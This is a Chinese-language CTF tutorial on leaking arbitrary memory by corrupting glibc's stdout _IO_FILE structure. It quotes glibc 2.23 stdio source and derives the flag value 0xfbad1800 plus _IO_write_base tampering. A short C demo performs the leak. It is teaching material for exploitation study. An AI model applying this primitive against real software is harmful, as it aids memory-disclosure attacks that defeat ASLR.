## _IO_FILE leak

&emsp;&emsp;<font size=2>在ctf中有时候会遇到一些无法输出堆内容的题目，但是我们可以利用puts函数，修改stdout的`_IO_FILE`结构体来实现任意地址泄漏的手法。看过[puts函数分析]([https://www.fandazh.cn/glibc2-23-_io_file%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90/](https://www.fandazh.cn/glibc2-23-_io_file相关函数原理分析/))的话就会明白IO缓冲区的原理以及这些IO函数是维护了一个`_IO_FILE`结构体来控制输入输出的。</font></br>

&emsp;&emsp;<font size=2>而这个结构体也已经被大佬们分析出来并成为一种利用手法了，那么本节我们首先讲如何利用他来泄漏，看过分析puts的文章后我们知道系统调用write是从`_IO_FILE`的vtable中的overflow函数成功进去的，也就是说我们首先要让控制流进入`_IO_OVERFLOW`，然后我们从`_IO_new_file_xsputn`函数开始看：</font></br>

```C
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
        {
          const char *p;
          for (p = s + n; p > s; )
            {
              if (*--p == '\n')
                { 
                  count = p - s + 1;
                  must_flush = 1;
                  break;
                }
            }
        }
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
        count = to_do;
#ifdef _LIBC
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
#else
      memcpy (f->_IO_write_ptr, s, count);
      f->_IO_write_ptr += count;
#endif
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
        /* If nothing else has to be written we must not signal the
           caller that everything has been written.  */
        return to_do == 0 ? EOF : n - to_do;
                                        
```

&emsp;&emsp;<font size=2>接下来我们一步步构造如何控制`_IO_OVERFLOW`输出我们的预期地址的数据。首先这里的data代表puts的参数字符串，n是这个字符串的长度，如果我们构造了`_IO_LINE_BUF`&&`_IO_CURRENTLY_PUTTING`标志位的话，控制流会进入第一个for，但是p指向的字符串不一定会有一个换行符（因为puts的输出会自动加一个换行符，所以我们调用的时候不需要写换行符），因此`must_flush`并不一定会置零，情况还挺麻烦的，因此我们不构造这两个标志位，避免进入第一个循环。</font></br>

&emsp;&emsp;<font size=2>接下来有一个`else if`的条件，我们在这里也要绕过这个判断，为了规避下方`to_do -= count;`可能的麻烦，毕竟也许可以构造成功，但是规避了总更方便。然后下一个`if (to_do + must_flush >0)`判断就必须要满足了，因为`must_flush`初始化为0，`to_do`初始化为n参数，所以可以满足判断，进入`_IO_OVERFLOW`：</font></br>

```C
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
        {
          _IO_doallocbuf (f);
          _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
        }
      /* Otherwise must be currently reading.
         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
         logically slide the buffer forwards one block (by setting the
         read pointers to all point at the beginning of the block).  This
         makes room for subsequent output.
         Otherwise, set the read pointers to _IO_read_end (leaving that
         alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
        {
          size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
          _IO_free_backup_area (f);
          f->_IO_read_base -= MIN (nbackup,
                                   f->_IO_read_base - f->_IO_buf_base);
          f->_IO_read_ptr = f->_IO_read_base;
        }

      if (f->_IO_read_ptr == f->_IO_buf_end)
        f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end; 
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
        f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
                         f->_IO_write_ptr - f->_IO_write_base);

```

&emsp;&emsp;<font size=2>第一个if的`_IO_NO_WRITES`是肯定不能进去的，一进去就直接返回前功尽弃了。往下我们同样避开满足`if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)`这个条件，因为下方对`f->xxxx`等成员的赋值会破坏我们想要输出的地址（后续会看到），必须绕过这个条件。然后因为调用此函数时`ch`参数是`EOF`，因此可以进入`_IO_do_write`：</font></br>

```C
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
        return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);

```

&emsp;&emsp;<font size=2>可以看到下方的`_IO_SYSWRITE`就是我们的目标了，就是这里进行了系统调用write输出内容，分析一下参数就可以知道，我们就是利用的`_IO_write_base`作为输出的起始地址，`_IO_write_ptr - _IO_write_base`就是输出的长度。接下来只剩下最后两个if了，如果我们满足`else if`的条件的话，还要经过一次`_IO_SYSSEEK`，比较麻烦，不知道会寻址到哪里去，不如直接构造`_IO_IS_APPENDING`标志位，`_offset`的设置无伤大雅，综上我们可以得出一个结论，要实现一次任意地址泄漏，我们可以如下构造：</font></br>

- _flags = 0xfbad0000;
- flags |=  _IO_CURRENTLY_PUTTING;	//0x800

- _flags |=  _IO_IS_APPENDING;    // 0x1000
- \_flags &=  (~_IO_NO_WRITES);    //0x8
- _flags = 0xfbad1800;

&emsp;&emsp;<font size=2>然后`_IO_write_base`和`_IO_write_ptr`只需要指向我们想要的泄漏区间就行了，这样就能完成任意地址泄漏，demo如下：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <libio.h>

typedef unsigned long long ull;

void setbufs()
{
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
}

int main()
{
	ull *p1, *p2, *p3, *p4, *p;
	_IO_FILE* pstdout;

	setbufs();

	// init the _IO_2_1_stdout_
	puts("hello,world!");
	pstdout = stdout;
	printf("&_flags:%llx\n", (ull)&pstdout->_flags);

	pstdout->_flags = (0xfbad0000 | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING & (~_IO_NO_WRITES));
	*(unsigned char*)&pstdout->_IO_write_base = 0;
  // leak here
	puts("something");

	return 0;
}

/*
struct _IO_FILE {
  int _flags;
  char* _IO_read_ptr;   
  char* _IO_read_end;   
  char* _IO_read_base;  
  char* _IO_write_base; 
  char* _IO_write_ptr;  
  char* _IO_write_end;  
  char* _IO_buf_base;   
  char* _IO_buf_end;    
  char *_IO_save_base;
  char *_IO_backup_base;
  char *_IO_save_end;

  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; 

#define __HAVE_COLUMN 
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
 */

```

